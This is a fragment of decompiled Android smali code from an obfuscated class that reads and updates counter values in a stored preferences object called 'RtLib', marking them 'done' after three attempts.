    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    const-string v1, "RtLib"

    invoke-virtual {v0, v1, v3}, La/a/a;->a(Ljava/lang/String;I)La/a/b/a;

    move-result-object v0

    sget-object v1, Lcom/test/NewC;->new_k:Ljava/lang/String;

    const-string v2, "done"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    goto/16 :goto_e

    :cond_e0
    iget-object v0, p0, Lcom/test/NewC;->m:La/a/a;

    const-string v1, "RtLib"

    invoke-virtual {v0, v1, v3}, La/a/a;->a(Ljava/lang/String;I)La/a/b/a;

    move-result-object v0

    sget-object v1, Lcom/test/NewC;->j:Ljava/lang/String;

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, La/a/b/a;->a(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-nez v1, :cond_f9

    sget-object v1, Lcom/test/NewC;->j:Ljava/lang/String;

    const-string v2, "1"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    goto :goto_cc

    :cond_f9
    const-string v2, "done"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_cc

    :try_start_101
    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    const/4 v2, 0x3

    if-lt v1, v2, :cond_120

    sget-object v1, Lcom/test/NewC;->j:Ljava/lang/String;

    const-string v2, "done"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    sget-object v1, Lcom/test/NewC;->new_l:Ljava/lang/String;

    const-string v2, "canot"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z
    :try_end_116
    .catch Ljava/lang/NumberFormatException; {:try_start_101 .. :try_end_116} :catch_117

    goto :goto_cc

    :catch_117
    move-exception v1

    sget-object v1, Lcom/test/NewC;->j:Ljava/lang/String;

    const-string v2, "1"

    invoke-virtual {v0, v1, v2}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z

    goto :goto_cc

    :cond_120
    :try_start_120
    sget-object v2, Lcom/test/NewC;->j:Ljava/lang/String;

    add-int/lit8 v1, v1, 0x1

    invoke-static {v1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v2, v1}, La/a/b/a;->b(Ljava/lang/String;Ljava/lang/Object;)Z
    :try_end_12b
    .catch Ljava/lang/NumberFormatException; {:try_start_120 .. :try_end_12b} :catch_117

    goto :goto_cc
.end method
